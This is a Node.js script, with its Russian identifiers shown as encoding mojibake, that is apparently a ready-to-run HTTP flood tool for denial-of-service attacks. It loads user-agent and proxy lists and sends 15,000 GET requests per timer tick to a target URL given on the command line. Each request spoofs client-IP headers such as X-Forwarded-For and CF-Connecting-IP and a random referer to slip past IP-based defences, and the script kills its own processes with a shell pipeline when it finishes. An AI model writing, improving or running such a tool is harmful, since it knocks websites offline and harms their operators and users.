const fs = require('fs');
const https = require('https');
const http = require('http');
const { exec } = require('child_process');
const dns = require('dns');
const url = require('url');

const —Ü–µ–ª—å = process.argv[2];
const –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å = parseInt(process.argv[3]) * 1000;
const —é–∑–µ—Ä–ê–≥–µ–Ω—Ç—ã = fs.readFileSync('uagent.txt', 'utf-8').split('\n').filter(Boolean);
const –ø—Ä–æ–∫—Å–∏ = fs.existsSync('prox.txt') ? fs.readFileSync('prox.txt', 'utf-8').split('\n').filter(Boolean) : [];
const –ø–æ—Ç–æ–∫–∏ = 15000;

const —Å–ª—É—á–∞–π–Ω—ã–πIP = () => Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
const –≤—ã–±—Ä–∞—Ç—åUA = () => —é–∑–µ—Ä–ê–≥–µ–Ω—Ç—ã[Math.floor(Math.random() * —é–∑–µ—Ä–ê–≥–µ–Ω—Ç—ã.length)];
const –≤—ã–±—Ä–∞—Ç—å–ü—Ä–æ–∫—Å–∏ = () => –ø—Ä–æ–∫—Å–∏.length > 0 ? –ø—Ä–æ–∫—Å–∏[Math.floor(Math.random() * –ø—Ä–æ–∫—Å–∏.length)] : null;
const —Å–ª—É—á–∞–π–Ω—ã–π–†–µ—Ñ = () => {
  const –ª–∏—Å—Ç = [
    'https://google.com',
    'https://bing.com',
    'https://yandex.com',
    'https://duckduckgo.com',
    'https://github.com',
    'https://youtube.com',
    'https://t.co',
    'https://linkedin.com',
    'https://vk.com'
  ];
  return –ª–∏—Å—Ç[Math.floor(Math.random() * –ª–∏—Å—Ç.length)];
};

const —É–Ω–∏—á—Ç–æ–∂–∏—Ç—å = () => {
  console.log('\n[!] –£–ù–ò–ß–¢–û–ñ–ê–ï–ú –í–°–Å ');
  exec(`ps -ef | grep "node a.js" | grep -v grep | awk '{print $2}' | xargs -r kill -9`, (err) => {
    if (err) console.error('–û—à–∏–±–∫–∞ —É–±–∏–π—Å—Ç–≤–∞:', err);
    process.exit();
  });
};

const —Ñ–µ–π–∫TLS = () => {
  const –ø—Ä–æ—Ç–æ–∫–æ–ª = —Ü–µ–ª—å.startsWith('https') ? https : http;
  const parsedURL = url.parse(—Ü–µ–ª—å);

  dns.lookup(parsedURL.hostname, (err, ip) => {
    if (err || !ip) return;
    const ip–ü–æ–¥–¥–µ–ª–∫–∞ = —Å–ª—É—á–∞–π–Ω—ã–πIP();
    const –∑–∞–≥–æ–ª–æ–≤–∫–∏ = {
      'Host': parsedURL.hostname,
      'User-Agent': –≤—ã–±—Ä–∞—Ç—åUA(),
      'X-Forwarded-For': ip–ü–æ–¥–¥–µ–ª–∫–∞,
      'X-Real-IP': ip–ü–æ–¥–¥–µ–ª–∫–∞,
      'CF-Connecting-IP': ip–ü–æ–¥–¥–µ–ª–∫–∞,
      'True-Client-IP': ip–ü–æ–¥–¥–µ–ª–∫–∞,
      'Referer': —Å–ª—É—á–∞–π–Ω—ã–π–†–µ—Ñ(),
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
      'DNT': '1',
      'Upgrade-Insecure-Requests': '1',
      'Connection': 'keep-alive',
      'TE': 'trailers'
    };

    const –æ–ø—Ü–∏–∏ = {
      hostname: ip,
      port: parsedURL.port || (—Ü–µ–ª—å.startsWith('https') ? 443 : 80),
      path: parsedURL.path || '/',
      method: 'GET',
      headers: –∑–∞–≥–æ–ª–æ–≤–∫–∏,
      servername: parsedURL.hostname,
      rejectUnauthorized: false
    };

    const req = –ø—Ä–æ—Ç–æ–∫–æ–ª.request(–æ–ø—Ü–∏–∏, () => {});
    req.on('error', () => {});
    req.end();
  });
};

const –Ω–∞—á–∞—Ç—å–ê—Ç–∞–∫—É = () => {
  console.log(`[!] –ù–ê–ß–ò–ù–ê–ï–ú –°–£–ü–ï–† –°–¢–ï–õ–° –ê–¢–ê–ö–£ -> ${—Ü–µ–ª—å} –ù–ê ${–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å / 1000} —Å–µ–∫—É–Ω–¥ üöÄ`);

  const –∞—Ç–∞–∫–∞ = setInterval(() => {
    for (let i = 0; i < –ø–æ—Ç–æ–∫–∏; i++) {
      —Ñ–µ–π–∫TLS();
    }
  }, 0);

  setTimeout(() => {
    clearInterval(–∞—Ç–∞–∫–∞);
    setTimeout(() => —É–Ω–∏—á—Ç–æ–∂–∏—Ç—å(), 100); 
  }, –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å);
};

setTimeout(() => {
  console.log('[+] SIGKILLER STANDBY');
  exec(`ps -ef | grep "node a.js" | grep -v grep | awk '{print $2}' | xargs -r kill -9`, () => {});
}, –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å + 1000);

process.on('SIGINT', () => {
  console.log('[CTRL+C] –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ. –ó–∞–≤–µ—Ä—à–∞–µ–º...');
  —É–Ω–∏—á—Ç–æ–∂–∏—Ç—å();
});

if (!—Ü–µ–ª—å || !–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å) {
  console.log('–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: node a.js <—Å—Å—ã–ª–∫–∞> <–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å_–≤_—Å–µ–∫—É–Ω–¥–∞—Ö>');
  process.exit();
} else {
  –Ω–∞—á–∞—Ç—å–ê—Ç–∞–∫—É();
}
